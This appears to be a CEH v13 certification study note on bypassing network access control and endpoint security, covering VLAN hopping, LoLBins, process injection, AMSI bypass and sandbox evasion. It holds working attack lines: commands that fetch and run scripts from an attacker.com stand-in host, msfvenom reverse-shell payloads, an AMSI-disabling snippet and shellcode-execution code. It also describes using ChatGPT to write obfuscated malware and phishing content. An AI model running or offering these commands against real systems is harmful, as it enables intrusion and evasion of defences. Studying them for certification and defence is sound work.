## 05 - Different Techniques To Bypass NAC and Endpoint Security

**Important Note:** These techniques are covered for educational and defensive purposes as part of CEH v13 certification training.

---

## Network Access Control (NAC) Bypass Techniques

### 1. VLAN Hopping

**Definition:** Technique to gain access to VLANs that should be restricted, bypassing network segmentation controls implemented by NAC systems.

#### Attack Methods:
- **Switch Spoofing:** Configure attacking device to mimic a switch
- **Double Tagging:** Use 802.1Q double tagging to hop between VLANs
- **DTP (Dynamic Trunking Protocol) Abuse:** Exploit automatic trunk negotiation
- **Native VLAN Attacks:** Attack traffic in the native VLAN

#### Implementation:
```bash
# Switch spoofing example (educational purposes)
# Configure interface as trunk port
sudo vconfig add eth0 100    # Add VLAN 100
sudo ifconfig eth0.100 up    # Bring up VLAN interface
sudo dhclient eth0.100       # Request IP from target VLAN

# Double tagging attack
# Create double-tagged frame to bypass VLAN restrictions
```

#### NAC Bypass Mechanism:
- **VLAN Assignment Bypass:** Circumvent NAC VLAN placement policies
- **Network Segmentation Defeat:** Access restricted network segments
- **Policy Enforcement Evasion:** Bypass VLAN-based access controls

### 2. Using Pre-authenticated Device

**Definition:** Technique leveraging already authenticated devices to bypass NAC authentication requirements.

#### Implementation Strategies:
- **MAC Address Cloning:** Copy MAC address of authenticated device
- **Certificate Theft:** Steal digital certificates from authenticated devices
- **Session Hijacking:** Take over existing authenticated sessions
- **Device Impersonation:** Mimic trusted device characteristics

#### Attack Process:
1. **Reconnaissance Phase:** Identify authenticated devices on network
2. **Information Gathering:** Collect device identifiers (MAC, certificates)
3. **Impersonation:** Configure attacking device with stolen identifiers
4. **Network Access:** Gain access using impersonated credentials

#### Tools and Techniques:
```bash
# MAC address cloning
sudo ifconfig eth0 down
sudo ifconfig eth0 hw ether 00:11:22:33:44:55
sudo ifconfig eth0 up

# Network scanning for authenticated devices
nmap -sn 192.168.1.0/24  # Discover active hosts
arp-scan -l              # Identify MAC addresses
```

### 3. Ghostwriting

**Definition:** Technique where an attacker uses a legitimate, authenticated device as a bridge to access restricted network resources.

#### Implementation Methods:
- **ARP Spoofing Bridge:** Use ARP poisoning to route traffic through authenticated device
- **Proxy Setup:** Configure authenticated device as network proxy
- **Tunneling Through Legitimate Device:** Establish tunnels via authenticated host
- **Session Piggybackhng:** Ride along with legitimate device sessions

#### Technical Approach:
```bash
# ARP spoofing to redirect traffic through authenticated device
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Setting up SOCKS proxy through authenticated device
ssh -D 8080 user@authenticated_device
```

#### Bypass Benefits:
- **Authentication Bypass:** Leverage existing authentication
- **Policy Inheritance:** Inherit network policies of legitimate device
- **Stealth Operations:** Hide malicious activity behind legitimate device

---

## Application and Process Security Bypass

### 4. Using Application Whitelisting

**Definition:** Technique to bypass application whitelisting controls by leveraging trusted applications to execute malicious code.

#### Bypass Methods:
- **Living off the Land (LoLBins):** Use legitimate system binaries for malicious purposes
- **Application Proxy Execution:** Execute malicious code through whitelisted applications
- **DLL Side-loading:** Load malicious DLLs through trusted applications
- **Script Execution via Trusted Apps:** Use trusted applications to execute scripts

#### Common LoLBins Examples:
```powershell
# PowerShell execution via trusted binaries
mshta.exe javascript:a=GetObject("script:https://attacker.com/script.sct").Exec()

# Rundll32 for DLL execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";x=new%20ActiveXObject("WScript.Shell");x.Run("calc");

# Regsvr32 for script execution
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll
```

### 5. Dechaining Macros

**Definition:** Technique to break up malicious macro execution into smaller, less detectable components that individually appear benign.

#### Implementation Strategy:
- **Macro Fragmentation:** Split malicious functionality across multiple macros
- **Time-Delayed Execution:** Use timers to space out macro executions
- **Event-Driven Triggers:** Use document events to trigger macro components
- **Cross-Document Chaining:** Chain macros across multiple documents

#### Evasion Benefits:
- **Behavioral Analysis Bypass:** Individual components appear non-malicious
- **Sandbox Evasion:** Avoid triggering sandbox detection thresholds
- **Static Analysis Defeat:** Break signature-based detection

### 6. Clearing Memory Hooks

**Definition:** Technique to remove or bypass security hooks placed in memory by endpoint security solutions.

#### Hook Types and Bypass:
- **API Hooks:** Remove or redirect API function hooks
- **Inline Hooks:** Restore original function bytes
- **IAT Hooks:** Restore Import Address Table entries
- **SSDT Hooks:** System Service Descriptor Table manipulation

#### Technical Implementation:
```c
// Example concept for unhooking (educational purposes)
// Restore original API function bytes
BYTE originalBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0x42, 0x00, 0x00, 0x00}; // Original NtCreateFile bytes
DWORD oldProtect;
VirtualProtect(pNtCreateFile, sizeof(originalBytes), PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pNtCreateFile, originalBytes, sizeof(originalBytes));
VirtualProtect(pNtCreateFile, sizeof(originalBytes), oldProtect, &oldProtect);
```

---

## Advanced Evasion Techniques

### 7. Process Injection

**Definition:** Technique of injecting malicious code into legitimate running processes to evade detection and inherit process privileges.

#### Injection Types:
- **DLL Injection:** Inject malicious DLL into target process
- **Process Hollowing:** Replace legitimate process memory with malicious code
- **Atom Bombing:** Use Windows atom tables for code injection
- **Manual DLL Loading:** Manually load DLLs without using LoadLibrary

#### Implementation Methods:
```c
// Classic DLL injection example (educational)
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath), NULL);

HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"),
    pDllPath, 0, NULL);
```

### 8. Using LoLBins (Living off the Land Binaries)

**Definition:** Technique using legitimate system binaries and tools for malicious purposes to evade detection.

#### Popular LoLBins:
- **PowerShell:** Script execution and download capabilities
- **Certutil:** File download and encoding/decoding
- **Bitsadmin:** Background file transfers
- **Wmic:** System information and remote execution
- **Regsvr32:** DLL registration and script execution

#### Examples:
```cmd
REM File download using legitimate tools
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/file.exe C:\temp\file.exe

REM Remote execution
wmic /node:"target" process call create "malicious_command"

REM Script execution
regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll
```

### 9. CPL (Control Panel) Side-Loading

**Definition:** Technique using Windows Control Panel files (.cpl) to execute malicious code while appearing as legitimate system components.

#### Implementation:
- **CPL File Creation:** Create malicious Control Panel applets
- **Side-Loading Attack:** Load malicious CPL through legitimate processes
- **Registry Manipulation:** Register malicious CPL files
- **User Interaction Abuse:** Trick users into executing CPL files

#### Technical Approach:
```c
// CPL file structure (educational purposes)
LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2) {
    switch (uMsg) {
        case CPL_INIT:
            // Initialize and execute malicious payload
            return TRUE;
        case CPL_GETCOUNT:
            return 1;
        // Additional message handling
    }
    return FALSE;
}
```

### 10. Using ChatGPT

**Definition:** Leveraging AI language models to generate evasive code, obfuscated payloads, or social engineering content that bypasses traditional detection methods.

#### Applications:
- **Code Generation:** Generate polymorphic or obfuscated malicious code
- **Social Engineering:** Create convincing phishing content
- **Payload Obfuscation:** Transform malicious payloads to avoid signatures
- **Anti-Analysis Techniques:** Generate code that evades automated analysis

#### Evasion Benefits:
- **Dynamic Code Generation:** Create unique payloads for each attack
- **Natural Language Processing:** Generate human-like social engineering content
- **Automated Obfuscation:** Automatically obfuscate existing malicious code

---

## Windows Security Feature Bypasses

### 11. Using Metasploit Templates

**Definition:** Using Metasploit framework's built-in evasion templates and encoders to generate payloads that bypass endpoint security solutions.

#### Key Features:
- **Evasion Modules:** Built-in modules specifically designed to bypass AV/EDR
- **Encoder Chains:** Multiple encoding layers to obfuscate payloads
- **Template Customization:** Modify existing templates for specific targets
- **Shikata Ga Nai:** Popular polymorphic encoder

#### Implementation:
```bash
# Generate evasive payload using Metasploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 \
         -f exe -o evasive_payload.exe

# Use custom template
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 \
         -x legitimate_app.exe -k \
         -f exe -o templated_payload.exe
```

### 12. Windows Antimalware Scan Interface (AMSI) Bypass

**Definition:** Technique to bypass Microsoft's Anti-Malware Software Interface that scans scripts and macros during execution.

#### AMSI Bypass Methods:
- **Memory Patching:** Patch AMSI.dll in memory to disable scanning
- **DLL Unhooking:** Remove AMSI hooks from PowerShell process
- **Reflection Bypass:** Use .NET reflection to bypass AMSI
- **PowerShell Downgrade:** Use older PowerShell versions without AMSI

#### Technical Implementation:
```powershell
# AMSI bypass example (educational purposes)
$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $ref.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)

# Alternative memory patching approach
[Byte[]] $patch = [Byte[]](0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$pointer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
```

---

## Social Engineering and Phishing Bypasses

### 13. Hosting Phishing Sites

**Definition:** Advanced techniques for hosting and distributing phishing sites that bypass URL filtering and reputation systems.

#### Hosting Strategies:
- **Domain Fronting:** Use CDN services to hide true hosting location
- **URL Shorteners:** Mask malicious URLs with legitimate shortening services
- **Dynamic DNS:** Use frequently changing domain names
- **Legitimate Cloud Services:** Host phishing content on trusted platforms

#### Evasion Techniques:
- **Homograph Attacks:** Use visually similar Unicode characters
- **Subdomain Abuse:** Use subdomains of legitimate sites
- **HTTPS Certificates:** Obtain legitimate SSL certificates for credibility
- **Content Delivery Networks:** Distribute content through CDNs

### 14. Passing Encoded Commands

**Definition:** Technique of encoding malicious commands to bypass command-line monitoring and analysis systems.

#### Encoding Methods:
- **Base64 Encoding:** Encode PowerShell commands in Base64
- **Unicode Encoding:** Use Unicode representations of commands
- **ROT13/Caesar Cipher:** Simple character substitution encoding
- **Custom Encoding:** Develop application-specific encoding schemes

#### Implementation Examples:
```powershell
# Base64 encoded PowerShell command
powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAHMAYwByAGkAcAB0AC4AcABzADEA

# Command obfuscation
$a='Invoke-WebRequest';$b='http://attacker.com/script.ps1';& $a $b|iex

# String concatenation evasion
('Inv'+'oke-Ex'+'pression') (('New-Ob'+'ject System.Net.WebC'+'lient').DownloadString('http://attacker.com/script.ps1'))
```

---

## DNS and Network Bypasses

### 15. Fast Flux DNS Method

**Definition:** Technique using rapidly changing DNS records to make malicious infrastructure difficult to block and track.

#### Implementation:
- **Rapid IP Changes:** Change A records every few minutes
- **Large IP Pools:** Use hundreds of compromised hosts as proxies
- **DNS TTL Manipulation:** Set very low TTL values for rapid updates
- **Geographically Distributed:** Spread infrastructure across multiple countries

#### Evasion Benefits:
- **Takedown Resistance:** Difficult to completely shut down infrastructure
- **IP Blacklist Evasion:** IP addresses change faster than blacklists update
- **Tracking Prevention:** Makes forensic investigation more difficult

### 16. Timing-based Evasion

**Definition:** Technique using carefully timed operations to evade detection systems that rely on temporal analysis.

#### Timing Strategies:
- **Sleep Delays:** Introduce random delays between operations
- **Business Hours Mimicry:** Operate only during normal business hours
- **Gradual Escalation:** Slowly increase malicious activity over time
- **Event-Driven Timing:** Time operations with legitimate system events

#### Implementation:
```python
import time
import random

# Random delay between operations
def evade_timing_analysis():
    # Random sleep between 5-30 minutes
    sleep_time = random.randint(300, 1800)
    time.sleep(sleep_time)
    
    # Execute malicious operation
    execute_payload()
    
    # Another random delay
    time.sleep(random.randint(600, 3600))
```

---

## Advanced Persistence and Execution

### 17. Signed Binary Proxy Execution

**Definition:** Technique using digitally signed legitimate binaries to execute malicious code, leveraging the trust associated with code signing.

#### Common Signed Binaries:
- **MSBuild.exe:** Microsoft Build Engine
- **InstallUtil.exe:** .NET Installer utility
- **RegAsm.exe:** Assembly Registration Tool
- **MSIExec.exe:** Windows Installer service

#### Implementation:
```xml
<!-- MSBuild project file for proxy execution -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Compile">
    <ClassLibrary>
      <Code>
        <![CDATA[
          using System;
          using System.Diagnostics;
          public class TestClass {
            public static void Test() {
              Process.Start("calc.exe");
            }
          }
        ]]>
      </Code>
    </ClassLibrary>
  </Target>
</Project>
```

### 18. Shellcode Encryption

**Definition:** Technique of encrypting shellcode payloads to evade signature-based detection and enable runtime decryption.

#### Encryption Methods:
- **AES Encryption:** Strong symmetric encryption for payload protection
- **XOR Encoding:** Simple but effective obfuscation method
- **Custom Encryption:** Application-specific encryption algorithms
- **Multi-Stage Decryption:** Multiple decryption layers for enhanced evasion

#### Implementation Approach:
```c
// Example shellcode encryption concept (educational)
void decrypt_and_execute_shellcode(BYTE* encrypted_shellcode, DWORD size, BYTE* key) {
    // Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Decrypt shellcode
    for(DWORD i = 0; i < size; i++) {
        ((BYTE*)exec_mem)[i] = encrypted_shellcode[i] ^ key[i % 16]; // Simple XOR decryption
    }
    
    // Execute decrypted shellcode
    ((void(*)())exec_mem)();
}
```

---

## Entropy and Detection Evasion

### 19. Reducing Entropy

**Definition:** Technique to reduce the randomness/entropy of malicious files to evade entropy-based detection systems.

#### Entropy Reduction Methods:
- **Padding with Common Data:** Add frequent byte patterns to reduce overall entropy
- **String Dilution:** Embed normal text strings within malicious code
- **Template Usage:** Use existing low-entropy templates for malicious files
- **Compression Avoidance:** Avoid compression that increases entropy

### 20. Escaping the (local) AV Sandbox

**Definition:** Techniques to detect and evade local antivirus sandbox environments during file analysis.

#### Sandbox Detection:
- **Environment Checks:** Detect VM artifacts and sandbox indicators
- **Timing Attacks:** Use delays to exceed sandbox analysis time
- **User Interaction Requirements:** Require mouse clicks or keyboard input
- **Anti-Analysis Techniques:** Check for analysis tools and debuggers

#### Evasion Methods:
```c
// Sandbox evasion checks (educational purposes)
BOOL is_sandbox() {
    // Check for VM artifacts
    HKEY hkey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Enum\\IDE", 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        // Check for VMware, VirtualBox artifacts
        return TRUE;
    }
    
    // Check system uptime
    DWORD uptime = GetTickCount();
    if (uptime < 10 * 60 * 1000) { // Less than 10 minutes
        return TRUE; // Likely sandbox
    }
    
    return FALSE;
}
```

---

## Windows-Specific Evasion

### 21. Disabling Event Tracing for Windows

**Definition:** Technique to disable or manipulate Windows Event Tracing (ETW) to avoid detection by security solutions that rely on ETW events.

#### ETW Manipulation:
- **Provider Disabling:** Disable specific ETW providers
- **Session Manipulation:** Interfere with ETW logging sessions
- **Event Filtering:** Filter out security-relevant events
- **Patch ETW Functions:** Modify ETW functions in memory

### 22. Evading "Mark of the Web"

**Definition:** Technique to bypass Windows "Mark of the Web" (MOTW) security feature that tags files downloaded from untrusted sources.

#### MOTW Bypass Methods:
- **Archive Extraction:** Extract files from archives (removes MOTW)
- **Copy Operations:** Copy files to remove alternate data streams
- **ISO/VHD Files:** Use disk images that don't inherit MOTW
- **Direct Memory Execution:** Execute code without writing to disk

### 23. Spoofing the Thread Call Stack

**Definition:** Advanced technique to manipulate the thread call stack to evade call stack-based detection mechanisms used by EDR solutions.

#### Implementation Concepts:
- **Return Address Manipulation:** Modify return addresses on stack
- **Frame Pointer Spoofing:** Alter frame pointers to hide call origins
- **Indirect Calls:** Use indirect function calls to obfuscate call chains
- **ROP/JOP Techniques:** Use Return/Jump-Oriented Programming

### 24. In-memory Encryption of Beacon

**Definition:** Technique to encrypt command and control beacon traffic in memory to evade memory scanning and network detection.

#### Memory Encryption Methods:
- **Runtime Encryption:** Encrypt C2 communications in real-time
- **Key Rotation:** Regularly change encryption keys
- **Memory Protection:** Use memory protection APIs to hide encrypted data
- **Steganographic Encoding:** Hide encrypted data within legitimate protocols

---

## Summary for CEH v13 Exam

### Critical NAC/Endpoint Bypass Techniques (High Priority):

#### **Tier 1 - Essential Knowledge:**
1. **VLAN Hopping** - Network segmentation bypass
2. **Using Pre-authenticated Device** - Authentication bypass via device impersonation  
3. **AMSI Bypass** - Microsoft's Anti-Malware Software Interface evasion
4. **Using LoLBins** - Living off the land binary techniques
5. **Process Injection** - Code injection into legitimate processes

#### **Tier 2 - Important Concepts:**
1. **Application Whitelisting Bypass** - Trusted application abuse
2. **Signed Binary Proxy Execution** - Leveraging code signing trust
3. **Fast Flux DNS** - Rapid infrastructure changes
4. **Shellcode Encryption** - Payload obfuscation techniques
5. **Timing-based Evasion** - Temporal analysis bypass

#### **Tier 3 - Advanced Topics:**
1. **Memory Hook Clearing** - Removing security hooks
2. **Entropy Reduction** - Evading entropy-based detection
3. **ETW Disabling** - Windows Event Tracing manipulation
4. **MOTW Bypass** - Mark of the Web evasion
5. **Call Stack Spoofing** - Advanced EDR evasion

### Key Exam Points:
- **Modern Techniques Focus:** Emphasis on current real-world evasion methods
- **Tool Recognition:** Know tools associated with each bypass technique
- **Defensive Understanding:** Understand how each technique can be detected/prevented
- **Practical Application:** Consider implementation challenges and limitations
- **Windows-Specific Knowledge:** Strong focus on Windows security feature bypasses

### Study Recommendations:
1. **Hands-on Practice:** Set up lab environments to test these techniques
2. **Tool Familiarity:** Practice with Metasploit, PowerShell, and common LoLBins
3. **Detection Methods:** Learn how security teams identify these attacks
4. **Countermeasures:** Understand defensive strategies for each technique
5. **Current Trends:** Stay updated on emerging bypass techniques and security updates

---
